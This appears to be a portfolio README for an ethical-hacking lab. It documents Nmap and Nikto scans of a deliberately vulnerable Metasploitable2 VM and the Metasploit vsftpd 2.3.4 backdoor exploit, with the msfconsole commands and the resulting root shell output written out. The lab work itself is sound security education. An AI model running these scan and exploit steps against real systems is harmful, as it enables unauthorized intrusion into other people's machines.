# Ethical Hacking Lab: Exploiting vsftpd 2.3.4 on Metasploitable2

This project demonstrates a successful ethical hacking lab where I scanned, identified, and exploited a known vulnerability in an intentionally vulnerable virtual machine. The goal was to simulate real-world penetration testing techniques and document the process for recruiters and hiring managers to review.

## Lab Setup

| Role            | Machine           | OS/Tool Used     |
|-----------------|-------------------|------------------|
| Attacker        | Kali Linux (VM)   | Kali 2025.1c     |
| Victim          | Metasploitable2   | Linux (Ubuntu)   |
| Virtual Network | Host-Only (VMnet1)| VMware Workstation 17 Player |

## Tools Used

- [Kali Linux](https://www.kali.org/)  
- [Metasploitable2](https://sourceforge.net/projects/metasploitable/)  
- [Nmap](https://nmap.org/)
- [Nikto](https://github.com/sullo/nikto)
- [Metasploit Framework](https://www.metasploit.com/)

## Reconnaissance and Scanning

### Nmap Scan

Command:
```bash
nmap -sS -sV -O -A <victim-ip>

ðŸ“Œ Notable Results:
Port 21: FTP â€” vsftpd 2.3.4 (known backdoor vulnerability)

Port 22: OpenSSH 4.7p1 Debian

Port 23: Telnet enabled

Port 25: Exim mail server

Port 80: Apache 2.2.8 (outdated)

Port 3306: MySQL database server

Port 5432: PostgreSQL database server

Port 8180: Apache Tomcat/5.5.20 (default credentials enabled)

Port 139/445: Samba file sharing service

ðŸ“¸ Screenshot:![Nmap Scan](./screenshots/Image1.png)

ðŸ”Ž Phase 2: Web Vulnerability Scan with Nikto
Command:
bash
nikto -h http://<victim-ip>

ðŸ“Œ Notable Results:
Apache version is outdated (2.2.8)

HTTP TRACE method is enabled (XST vulnerability)

PHP version is outdated (5.2.4-2ubuntu5.10)

/phpinfo.php is exposed (leaks environment variables)

/phpmyadmin and changelogs are exposed

Directory indexing is enabled

CVE-2009-3555 and other known Apache vulnerabilities are present

ðŸ“¸ Screenshot:![Nikto Scan](./screenshots/Image2.png)

ðŸ’¥ Phase 3: Exploitation with Metasploit (vsftpd 2.3.4 Backdoor)
Commands:
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <victim-ip>
set RPORT 21
run

ðŸ’£ Result:
[*] 192.168.X.X:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.X.X:21 - Exploit completed, but no session was created
[*] 192.168.X.X:21 - Attempting to trigger backdoor...
[*] Command shell session 1 opened

ðŸ›  Post-Exploitation Commands:
bash
whoami
uname -a
hostname
id

ðŸ“Œ Output:

OS: Linux metasploitable 2.6.x

Hostname: metasploitable

Access: Remote shell confirmed
